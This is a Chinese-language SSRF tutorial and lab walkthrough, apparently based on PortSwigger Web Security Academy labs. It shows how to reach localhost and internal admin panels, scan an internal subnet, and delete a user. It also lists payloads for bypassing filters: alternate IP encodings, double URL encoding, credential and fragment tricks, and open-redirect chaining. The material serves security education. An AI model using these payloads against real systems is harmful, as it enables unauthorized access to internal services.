# SSRF

SSRF（Server-Side Request Forgery）是一种Web安全漏洞，攻击者可以通过该漏洞诱导服务器端应用程序向非预期的目标地址发送请求。

在典型的SSRF攻击场景中，**攻击者可使服务器连接到**组织基础设施中**仅限于内部访问的服务**。此外，攻击者还可能操控服务器与任意的外部系统建立连接。此类攻击可能导致授权凭证等敏感数据外泄，造成重大安全风险。



## 本地服务器

在针对服务器的服务端请求伪造（SSRF）攻击中，攻击者会诱使应用程序通过其环回网络接口向托管该应用程序的服务器发起HTTP请求。这种攻击通常通过提供包含`127.0.0.1`（指向环回适配器的保留IP地址）或`localhost`（同一适配器的常用名称）等主机名的URL来实现。

例如，假设某购物应用程序允许用户查看特定商品的库存状态。为提供库存信息，该应用程序需要查询多个后端REST API接口。其实现方式是通过前端HTTP请求将URL参数传递给相关后端API端点。当用户查看商品库存状态时，其浏览器会发出如下请求：

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```



这将导致服务器向指定URL发起请求，检索库存状态并返回给用户。

在此示例中，攻击者可以修改请求参数，指定服务器本地的URL：

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://localhost/admin
```

服务器将获取`/admin`路径的内容并返回给用户。



虽然攻击者可以直接访问`/admin`路径，但管理功能通常仅限于经过身份验证的用户。这意味着攻击者通常无法查看敏感信息。然而，当请求来自本地机器时，常规的访问控制机制将被绕过。由于此类请求看似源自可信位置，应用程序会完全开放管理功能的访问权限。



### 隐式信任机制

**应用程序为何会对本地请求采取隐式信任机制？**这种设计模式的形成存在多重技术动因：

- 访问控制机制可能部署于应用服务器前端的不同组件中。当请求通过回环接口（loopback interface）发回本机时，，该检查会被绕过。
- 出于灾难恢复的目的，应用程序可能允许来自本地机器的任何用户无需登录即可获得管理访问权限。这为管理员在丢失凭据时提供了一种恢复系统的方法。此机制假设只有完全可信的用户会直接从服务器访问。
- 管理控制台通常监听独立于主应用的专用端口（如8080与8443的端口隔离），普通用户无法通过常规访问路径接触该接口。



这类信任关系，即源自本地机器的请求与普通请求处理方式不同，常常使 SSRF 成为关键漏洞。



### 实验

该实验环境具备库存查询功能，该功能会从内部系统获取数据。

实验目标：修改库存查询功能的URL地址为**本地管理后台界面（`http://localhost/admin`）**，并删除用户 `carlos` 。



SSRF 漏洞发现过程，在网页中查看商品的详情。

![image-20250315083815173](./images/SSRF.assets/image-20250315083815173.png)

在商品详情的最下方，有“查看库存”的按钮，可以查看商品的剩余库存。

![image-20250315083919174](./images/SSRF.assets/image-20250315083919174.png)



通过 Burp Suite 抓包发现，服务器端应用程序向后端 REST API 接口发起 HTTP 请求。

```
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2
```

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=2
```



将 stockApi 的地址修改为要访问的内部服务的地址（`http://localhost/admin`）。

```
stockApi=http://localhost/admin
```



使用 BurpSuite 发送 HTTP 请求，成功访问到目标服务器。

![image-20250315091035202](./images/SSRF.assets/image-20250315091035202.png)



通过查看原始 HTTP 元素，找到删除用户的接口。

```
<a href="/admin/delete?username=wiener">
<a href="/admin/delete?username=carlos">
```



将 stockApi 的地址修改删除用户的接口的地址，并使用 BurpSuite 发送数据包。

```
stockApi=http://localhost/admin/delete?username=carlos
```

服务器返回内容

```
HTTP/2 302 Found
Location: /admin
Set-Cookie: session=UpcZIVyu7yNnOa9irECMAQGhjj6FkSDj; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```



再次访问 admin 页面，用户 carlos 被成功删除。

![image-20250315093129201](./images/SSRF.assets/image-20250315093129201.png)



## 内网服务器

在某些场景中，应用服务器能够与用户无法直接访问的后端系统进行交互。这些系统通常使用不可路由的私有IP地址。由于受到网络拓扑结构的天然保护，这类后端系统往往安全防护较弱。许多情况下，内部后端系统包含敏感功能，任何能够与其交互的用户都可以在无需身份验证的情况下访问这些功能。



延续前例场景，假设存在一个位于后端地址的管理后台界面 `https://192.168.0.68/admin` 。攻击者可通过提交以下请求利用该SSRF漏洞访问管理界面：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://192.168.0.68/admin
```



### 实验

本实验包含一个库存查询功能，该功能会从内部系统获取数据。

实验目标：使用库存检查功能，扫描内网192.168.0.X 网段内的 IP，查找端口 `8080` 上的管理界面，然后使用它删除用户 `carlos` 。



这个实验和上一个实验的区别是，上一个实验的管理界面 IP 是回环地址，而该实验管理页面的 IP 在 192.168.0.X 网段内，需要扫描以确认具体的 IP。

 使用 Burp Suite 的 Intruder 功能进行批量发送 HTTP 请求进行爆破。

```
stockApi=http://192.168.0.$host$:8080/admin
```



将 host 值设置为 payload （类型：数值），范围 1 到 254 ，间隔 1。

![image-20250315092709031](./images/SSRF.assets/image-20250315092709031.png)



使用状态码对爆破结果进行排序，状态码为 200 的请求为正确的地址，后端地址为 192.168.0.184 。

![image-20250315092850113](./images/SSRF.assets/image-20250315092850113.png)



发送以下 HTTP 请求即可删除 carlos 用户。

```
stockApi=http://192.168.0.184:8080/admin/delete?username=carlos
```

![image-20250315093122317](./images/SSRF.assets/image-20250315093122317.png)





## 防御绕过

应用程序中常可见到服务端请求伪造（SSRF）漏洞与防范机制并存的现象。这些旨在阻挡恶意攻击的防护措施，往往仍存在被绕过的可能性。



通过篡改库存查询请求的URL，访问位于 http://localhost/admin 的管理员后台界面，并删除用户carlos。

开发者在此系统中部署了两组脆弱的反 SSRF 防御机制。



直接通过 http://localhost/admin 访问管理员页面，请求被过滤。

```
stockApi=http://localhost/admin
```

```
POST /product/stock HTTP/2
Host: 0a68000303d5b924801c2b5d005d0041.web-security-academy.net

stockApi=http://localhost/admin
```



某些应用程序会阻止包含主机名（如 `127.0.0.1` 和 `localhost` ）或敏感 URL（如 `/admin` ）的参数。在这种情况下，您通常可以使用以下技巧绕过过滤器：

- 采用 `127.0.0.1` 的其他表示形式：`2130706433`（十进制整型IP）、`017700000001`（八进制表示）和 `127.1`（短地址格式）。
- 注册您自己的域名，将其解析到 `127.0.0.1` 。
- 使用 URL 编码或大小写变化混淆被阻止的字符串。
- 提供一个您控制的 URL，该 URL 重定向到目标 URL。尝试使用**不同的重定向代码**以及**对跳转到的目标 URL 使用不同协议**。（在重定向过程中从 `http:` 切换到 `https:` URL 已被证明可以绕过某些反 SSRF 过滤器）





### 短地址绕过

```
stockApi=http://127.1/admin
```



### 域名解析绕过

```
stockApi=http://spoofed.burpcollaborator.net/admin
```

注：域名 spoofed.burpcollaborator.net 解析到 127.0.0.1。



### 大小写绕过

```
stockApi=http://LocalHost/Admin
```



### 白名单

当应用程序采用白名单校验机制时，其输入过滤器通常要求输入内容必须匹配预设许可值列表。这类过滤器可能检查输入值的起始部分或包含关系。通过利用URL解析的差异性，攻击者可能绕过此类防护机制。



### 凭证嵌入

URL 规范包含若干易被忽略的解析特性，特别是当应用程序使用临时方案实现 URL 解析和验证时：

**凭证嵌入**：可在主机名前使用`@`符号注入访问凭证。例如：

```
https://expected-host:fakepassword@evil-host

协议://[认证信息]@[实际访问主机]
 ↑      ↑              ↑
https   expected-host  evil-host
        (白名单域名)    (攻击者控制的主机)
```



### 片段标识

**片段标识**：利用`#`符号构造URL片段。例如：

```
https://evil-host#expected-host

协议://[实际访问主机]#[URL片段]
 ↑       ↑          ↑
https    evil-host  expected-host
         (攻击域名)   (白名单域名)
```



### DNS层级欺骗

**DNS层级欺骗**：通过完全限定域名将白名单域名嵌套至攻击者控制的域中。例如：

```
https://expected-host.evil-host

协议://[子域名].[主域名]
 ↑        ↑      ↑
https     |   evil-host
          |   (攻击者控制的域名)
          |
         expected-host
         (白名单允许的字段) 
```



### 编码

**编码混淆技术**：

- 当过滤机制与后端HTTP请求处理器对URL编码字符存在解析差异时，可通过编码字符进行混淆
- 尝试双重编码字符，某些服务器会递归执行URL解码，可能引发解析歧义



双重 URL 混合强制编码

```
http://localhost/admin
```

```
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

注：对 localhost 和 admin 部分的字符串使用强制编码两次



```
stockApi=http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```



**组合攻击**：建议综合运用上述技术实施组合攻击



### 重定向

在某些场景下，攻击者可通过利用开放重定向漏洞绕过基于过滤器的防御机制。

在先前示例中，假设应用程序对用户提交的 URL 进行严格验证以防止 SSRF 漏洞被恶意利用。然而，该应用允许访问的某个合法域名（如weliketoshop.net）存在开放重定向漏洞。若后端 HTTP 请求所使用的 API 支持重定向操作，攻击者可构造满足过滤条件但最终跳转至目标内网地址的URL链。



当应用程序存在如下形式的开放重定向漏洞时：

```
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

该请求会触发重定向至：

```
http://evil-user.net
```



攻击者可结合 SSRF 漏洞发起以下复合攻击：

```
POST /product/stock HTTP/1.0  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 118  
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

此 SSRF 漏洞之所以有效，是因为应用程序首先验证了提供的 `stockAPI` URL 位于允许的域名上，确实如此。随后，应用程序请求该提供的 URL，从而触发了开放重定向。它跟随重定向，并向攻击者选择的内部 URL 发起请求。



